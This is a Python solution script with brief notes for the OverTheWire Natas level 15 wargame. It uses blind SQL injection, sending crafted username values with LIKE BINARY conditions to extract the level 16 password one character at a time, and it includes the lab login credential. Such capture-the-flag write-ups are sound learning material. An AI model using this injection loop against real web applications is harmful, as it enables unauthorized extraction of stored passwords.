#!/usr/bin/env python3
'''
Level 15 → Level 16  version 2
BLIND SQL Injection

https://www.abatchy.com/2016/11/natas-level-14-and-15

Username: natas15
URL:      http://natas15.natas.labs.overthewire.org
password:   AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J


write up:
 1. $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";   
 2. The input isn’t being sanitized before the value is placed in the SQL query to the database
 3. The script doesn’t echo the query results back to the client.
 4.   
   CREATE TABLE `users` (
      `username` varchar(64) DEFAULT NULL,
      'password` varchar(64) DEFAULT NULL
    );
 
 We’re given the structure of the users table. 
 The users table has two columns: username, and password - and they both accept a maximum of 64 characters. 

 5. Since we’re trying to get to NATAS 16,
  I naturally tried natas16 as a username.

'''

import requests
from requests.auth import HTTPBasicAuth

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = 'http://%s.natas.labs.overthewire.org/' % username

#characters = lowercase + uppercase + digits
#characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
#print(characters)


chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''

for char in chars:
    Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
    r = requests.post( 'http://natas15.natas.labs.overthewire.org/index.php?debug',
            auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),
            data = Data
                      )
    if 'exists' in r.text:
        filtered = filtered + char

for i in range(0,32):
 for char in filtered:
   Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
   r = requests.post(
        'http://natas15.natas.labs.overthewire.org/index.php?debug',
        auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),
        data = Data
     )
   if 'exists' in r.text :
            passwd = passwd + char
            print(passwd)
            break


'''
WHERE CustomerName LIKE 'a%' 	Finds any values that start with "a"
  '%a' 	 end with "a"
  '%or%' 	  have "or" in any position
  '_r%' 	  "r" in the second position
  'a_%' 	  start with "a" and are at least 2 characters in length
  'a__%' 	  "a" and are at least 3 characters in length
  'a%o' 	 start with "a" and ends with "o"


'''